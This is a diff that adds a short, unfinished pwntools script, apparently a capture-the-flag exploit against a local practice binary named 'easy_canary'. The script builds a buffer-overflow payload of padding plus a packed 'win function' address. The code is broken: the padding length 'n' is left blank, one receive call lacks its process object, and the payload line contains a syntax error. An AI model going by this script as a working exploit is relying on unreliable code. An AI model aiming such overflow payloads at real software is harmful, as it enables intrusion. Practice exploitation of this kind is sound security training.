@@ -1,0 +1,12 @@
+from pwn import *
+
+r = process("./easy_canary")
+
+s=r.recvuntil(b"> ")
+r.sendline(b"1")
+s = recvuntil(b"Name: ")
+n=
+
+win_function=p64(0x00000000004007cd)
+
+payload = b'A'*n + + win_function
